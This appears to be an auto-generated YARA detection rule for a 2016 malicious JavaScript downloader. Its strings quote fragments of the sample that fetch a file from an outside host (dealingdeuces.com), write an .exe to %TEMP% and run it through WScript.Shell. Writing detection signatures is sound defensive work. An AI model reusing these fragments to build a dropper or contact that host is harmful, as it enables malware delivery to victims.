rule sig_20160329_52f61b44623cc7c1d56d6b9f10d29979 {
  meta:
    description = "datamaliciousorder - file 20160329_52f61b44623cc7c1d56d6b9f10d29979.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "84f5ede6dcf8067cea34c4d4fbecdf5a4d4341bc1fc74c42696a954defaf7205"

  strings:
    $s1  = "y0[F](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function a() {return M0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZDW94i5mW.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[W0](Pv() * 11); if (y0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function a0(tl, b0){dq = dq * 1; return tl - b0;};" fullword ascii
    $s5  = "var M0 = function K() {return WScript[bz](\"WScript.Shell\");}(), zb = 11;" fullword ascii
    $s6  = "function Xi(){return \"\" + W;};" fullword ascii
    $s7  = "function y() {return ((M == true) && (M == w)) ? 1 : dq;};" fullword ascii
    $s8  = "function Xz(nr){M0[\"Run\"](nr, dq, dq);};" fullword ascii
    $s9  = "function h()" fullword ascii
    $s10 = "var lt = new this[\"Date\"]();" fullword ascii
    $s11 = "function D(){return bz;};" fullword ascii
    $s12 = "return a0(b, n);" fullword ascii
    $s13 = "function Pv(){return 22;};" fullword ascii
    $s14 = " while (KR){" fullword ascii
    $s15 = "function qG(P) {var T = (1, 2, 3, 4, 5, P); return T;};" fullword ascii
    $s16 = "var w = false;" fullword ascii
    $s17 = "w = true; " fullword ascii
    $s18 = "M = true; " fullword ascii
    $s19 = "} catch(U){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}